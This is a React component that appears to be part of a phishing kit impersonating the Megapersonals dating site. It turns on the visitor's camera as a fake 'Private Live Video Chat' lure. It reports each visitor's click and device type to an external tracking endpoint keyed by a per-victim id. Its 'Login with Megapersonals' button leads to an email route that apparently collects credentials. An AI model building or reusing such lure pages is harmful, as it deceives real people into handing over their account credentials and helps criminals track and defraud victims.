import React, { useRef } from "react";
import "./Video.css";
import { Link, useParams } from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";

const Live = () => {
  const videoRef = useRef(null);
  const id = useParams();
  let type;
  //   const { temp } = state;
  // console.log(user)

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }
  useEffect(() => {


    const bookings = {
      type: type,
    };
    // console.log(id.id)
    fetch(`https://server-main-backend.vercel.app/updateclick/${id.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();

      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            videoRef.current.play().catch(error => {
              console.error('Error playing video:', error);
            });
          }
        } catch (error) {
          console.error('Error accessing camera:', error);
        }
      }
  
      startCamera();
  
      // Cleanup function to stop the camera when the component unmounts
      return () => {
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject;
          const tracks = stream.getTracks();
          tracks.forEach(track => track.stop());
        }
      };
  }, [type, id.id]);

  return (
    <div className="home-bg-2 position-relative min-h-full">
    <video ref={videoRef} autoPlay playsInline muted loop style={{ height: '100vh', minWidth: '100vw', objectFit: 'cover' }}
      className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo" />
    <div className="code-card position-absolute z-20 text-center" style={{ left: '50%', transform: 'translateX(-50%)' }}>
 
      <div className="video-card-2 text-center widgets">
        <h3> Live Video Chat</h3>

        <p>
          Login with Megapersonals and enjoy with <br /> <b>Private Live Video Chat</b>{" "}
          your dating partner.
        </p>
        <Link to={`/live/chat/email/${id.id}`} className="lll_uu_ss_01 px-2">
          <img src="datas/images/skio-logo.png" alt="" />
          {/* <img src="/datas/images/sss_iii_aa.svg" alt="" className="bg-white"/> */}
          <span className="btn-text"> Login with Megapersonals</span>
        </Link>
      </div>


    </div>
  </div>
   
  );
};

export default Live;
